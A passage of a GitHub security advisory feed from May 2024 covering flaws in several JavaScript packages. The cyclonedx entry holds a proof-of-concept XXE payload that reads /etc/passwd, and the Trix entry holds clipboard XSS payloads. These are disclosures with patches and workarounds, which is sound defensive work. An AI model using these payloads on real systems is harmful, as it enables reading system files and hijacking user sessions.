        <link href="https://github.com/advisories/GHSA-38gf-rh2w-gmj7"/>
        <updated>2024-05-08T19:55:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>XML External entity injections could be possible, when running the provided XML Validator on arbitrary input.</p>
<h4 id="poc">POC</h4>
<pre><code class="language-js">const {
  Spec: { Version },
  Validation: { XmlValidator }
} = require('@cyclonedx/cyclonedx-library');

const version = Version.v1dot5;
const validator = new XmlValidator(version);
const input = `&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE poc [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;bom xmlns="http://cyclonedx.org/schema/bom/1.5"&gt;
  &lt;components&gt;
    &lt;component type="library"&gt;
      &lt;name&gt;testing&lt;/name&gt;
      &lt;version&gt;1.337&lt;/version&gt;
      &lt;licenses&gt;
        &lt;license&gt;
          &lt;id&gt;&amp;xxe;&lt;/id&gt;&lt;!-- &lt;&lt; XML external entity (XXE) injection --&gt;
        &lt;/license&gt;
      &lt;/licenses&gt;
    &lt;/component&gt;
  &lt;/components&gt;
&lt;/bom&gt;`;

// validating this forged(^) input might lead to unintended behaviour
// for the fact that the XML external entity would be taken into account.
validator.validate(input).then(ve =&gt; {
  console.error('validation error', ve);
});
</code></pre>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in <code>@cyclonedx/cyclonedx-library@6.7.1 </code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not run the provided XML validator on untrusted inputs.</p>
<h3 id="references">References</h3>
<ul>
<li>issue was introduced via <a href="https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063">https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063</a>.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7">https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7</a></li>
<li><a href="https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063">https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063</a></li>
<li><a href="https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203">https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203</a></li>
<li><a href="https://github.com/advisories/GHSA-38gf-rh2w-gmj7">https://github.com/advisories/GHSA-38gf-rh2w-gmj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38gf-rh2w-gmj7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-08T19:55:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trix] Trix Editor Arbitrary Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qjqp-xr96-cj99</id>
        <link href="https://github.com/advisories/GHSA-qjqp-xr96-cj99"/>
        <updated>2024-05-07T18:48:11.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.1, is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.</p>
<p><strong>Vulnerable Versions</strong>: Up to 2.1.0</p>
<p><strong>Fixed Version</strong>: 2.1.1</p>
<p><strong>Vector</strong>:</p>
<ul>
<li><strong>Bug 1</strong>: When copying content manipulated by a script, such as:</li>
</ul>
<pre><code class="language-js">document.addEventListener('copy', function(e){
  e.clipboardData.setData('text/html', '&lt;div&gt;&lt;noscript&gt;&lt;div class="123&lt;/noscript&gt;456&lt;img src=1 onerror=alert(1)//"&gt;&lt;/div&gt;&lt;/noscript&gt;&lt;/div&gt;');
  e.preventDefault();
});
</code></pre>
<p>and pasting into the Trix editor, the script within the content is executed.</p>
<ul>
<li><strong>Bug 2</strong>: Similar execution occurs with content structured as:</li>
</ul>
<pre><code class="language-js">document.write(`copy&lt;div data-trix-attachment="{&amp;quot;contentType&amp;quot;:&amp;quot;text/html&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;lt;img src=1 onerror=alert(101)&amp;gt;HELLO123&amp;quot;}"&gt;&lt;/div&gt;me`);
</code></pre>
<h3 id="impact">Impact:</h3>
<p>An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<h3 id="remediation">Remediation:</h3>
<p><strong>Update Recommendation</strong>: Users should upgrade to Trix editor version 2.1.1 or later, which incorporates proper sanitization of input from copied content.</p>
<p><strong>CSP Enhancement</strong>: Additionally, enhancing the Content Security Policy (CSP) to disallow inline scripts can significantly mitigate the risk of such vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
<h3 id="references">References:</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
</ul>
<p><strong>Credit</strong>: These issues were reported by security researchers <a href="https://hackerone.com/loknop">loknop</a> and <a href="https://hackerone.com/pinpie">pinpie</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad">https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad</a></li>
<li><a href="https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554">https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34341">https://nvd.nist.gov/vuln/detail/CVE-2024-34341</a></li>
<li><a href="https://github.com/advisories/GHSA-qjqp-xr96-cj99">https://github.com/advisories/GHSA-qjqp-xr96-cj99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjqp-xr96-cj99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-07T16:49:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[react-pdf] react-pdf vulnerable to arbitrary JavaScript execution upon opening a malicious PDF with PDF.js]]></title>
        <id>https://github.com/advisories/GHSA-87hq-q4gp-9wr4</id>
        <link href="https://github.com/advisories/GHSA-87hq-q4gp-9wr4"/>
        <updated>2024-05-08T10:10:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If PDF.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad">This patch</a> forces <code>isEvalSupported</code> to <code>false</code>, removing the attack vector.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Set <code>options.isEvalSupported</code> to <code>false</code>, where <code>options</code> is <code>Document</code> component prop.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4">https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34342">https://nvd.nist.gov/vuln/detail/CVE-2024-34342</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe">https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad">https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad</a></li>
<li><a href="https://github.com/advisories/GHSA-87hq-q4gp-9wr4">https://github.com/advisories/GHSA-87hq-q4gp-9wr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87hq-q4gp-9wr4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-07T16:48:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[react-pdf] react-pdf vulnerable to arbitrary JavaScript execution upon opening a malicious PDF with PDF.js]]></title>
        <id>https://github.com/advisories/GHSA-87hq-q4gp-9wr4</id>
        <link href="https://github.com/advisories/GHSA-87hq-q4gp-9wr4"/>
        <updated>2024-05-08T10:10:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If PDF.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad">This patch</a> forces <code>isEvalSupported</code> to <code>false</code>, removing the attack vector.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Set <code>options.isEvalSupported</code> to <code>false</code>, where <code>options</code> is <code>Document</code> component prop.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4">https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34342">https://nvd.nist.gov/vuln/detail/CVE-2024-34342</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe">https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad">https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad</a></li>
<li><a href="https://github.com/advisories/GHSA-87hq-q4gp-9wr4">https://github.com/advisories/GHSA-87hq-q4gp-9wr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87hq-q4gp-9wr4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-07T16:48:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pdfjs-dist] PDF.js vulnerable to arbitrary JavaScript execution upon opening a malicious PDF]]></title>
        <id>https://github.com/advisories/GHSA-wgrm-67xf-hhpq</id>
        <link href="https://github.com/advisories/GHSA-wgrm-67xf-hhpq"/>
        <updated>2024-05-07T10:26:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If pdf.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>
<h3 id="patches">Patches</h3>
<p>The patch removes the use of <code>eval</code>:
<a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Set the option <code>isEvalSupported</code> to <code>false</code>. </p>
<h3 id="references">References</h3>
<p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>
<li><a href="https://github.com/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/advisories/GHSA-wgrm-67xf-hhpq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgrm-67xf-hhpq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-07T10:25:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vditor] Vditor allows Cross-site Scripting via an attribute of an `A` element]]></title>
        <id>https://github.com/advisories/GHSA-m5jf-8crm-r65m</id>
        <link href="https://github.com/advisories/GHSA-m5jf-8crm-r65m"/>
        <updated>2024-05-03T20:38:16.000Z</updated>
        <content type="html"><![CDATA[<p>Vditor 3.10.3 allows XSS via an attribute of an <code>A</code> element.</p>
<p>NOTE: the vendor indicates that a user is supposed to mitigate this via <code>sanitize=true</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34449">https://nvd.nist.gov/vuln/detail/CVE-2024-34449</a></li>
<li><a href="https://github.com/Vanessa219/vditor/issues/1604">https://github.com/Vanessa219/vditor/issues/1604</a></li>
<li><a href="https://github.com/Vanessa219/vditor/blob/b3a14d6e4462b0c17141e1fcc66173264ada64e0/README_en_US.md?plain=1#L310">https://github.com/Vanessa219/vditor/blob/b3a14d6e4462b0c17141e1fcc66173264ada64e0/README_en_US.md?plain=1#L310</a></li>
<li><a href="https://github.com/advisories/GHSA-m5jf-8crm-r65m">https://github.com/advisories/GHSA-m5jf-8crm-r65m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5jf-8crm-r65m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-03T18:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kurwov] kurwov vulnerable to Denial of Service due to improper data sanitization]]></title>
        <id>https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</id>
        <link href="https://github.com/advisories/GHSA-hfrv-h3q8-9jpr"/>
        <updated>2024-05-03T20:30:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe sanitization of dataset contents on the <code>MarkovData#getNext</code> method used in <code>Markov#generate</code> and <code>Markov#choose</code> allows a maliciously crafted string on the dataset to throw and stop the function from running properly.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44">https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44</a></p>
<p>If a string contains a forbidden substring (i.e. <code>__proto__</code>) followed by a space character, the second line will access a special property in <code>MarkovData#finalData</code> by removing the last character of the string, bypassing the dataset sanitization (as it is supposed to be already sanitized before this function is called).</p>
<p><code>data</code> is then defined as the special function found in its prototype instead of an array.</p>
<p>On the last line, <code>data</code> is then indexed by a random number, which is supposed to return a string but returns undefined as it's a function. Calling <code>endsWith</code> then throws.</p>
<h3 id="poc">PoC</h3>
<p><a href="https://runkit.com/embed/m6uu40r5ja9b">https://runkit.com/embed/m6uu40r5ja9b</a></p>
<h3 id="impact">Impact</h3>
<p>Any dataset can be contaminated with the substring making it unable to properly generate anything in some cases.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xiboon/kurwov/security/advisories/GHSA-hfrv-h3q8-9jpr">https://github.com/xiboon/kurwov/security/advisories/GHSA-hfrv-h3q8-9jpr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34075">https://nvd.nist.gov/vuln/detail/CVE-2024-34075</a></li>
<li><a href="https://github.com/xiboon/kurwov/commit/85d63e652594f121d6656177d7a3c0d823c976c9">https://github.com/xiboon/kurwov/commit/85d63e652594f121d6656177d7a3c0d823c976c9</a></li>
<li><a href="https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44">https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrv-h3q8-9jpr">https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-03T20:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs] libxmljs vulnerable to type confusion when parsing specially crafted XML]]></title>
        <id>https://github.com/advisories/GHSA-6433-x5p4-8jc7</id>
        <link href="https://github.com/advisories/GHSA-6433-x5p4-8jc7"/>
        <updated>2024-05-03T20:24:30.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking a function on the result of <code>attrs()</code> that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34391">https://nvd.nist.gov/vuln/detail/CVE-2024-34391</a></li>
<li><a href="https://github.com/libxmljs/libxmljs/issues/645">https://github.com/libxmljs/libxmljs/issues/645</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs-attrs-type-confusion-rce-jfsa-2024-001033988">https://research.jfrog.com/vulnerabilities/libxmljs-attrs-type-confusion-rce-jfsa-2024-001033988</a></li>
<li><a href="https://github.com/advisories/GHSA-6433-x5p4-8jc7">https://github.com/advisories/GHSA-6433-x5p4-8jc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6433-x5p4-8jc7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
</feed>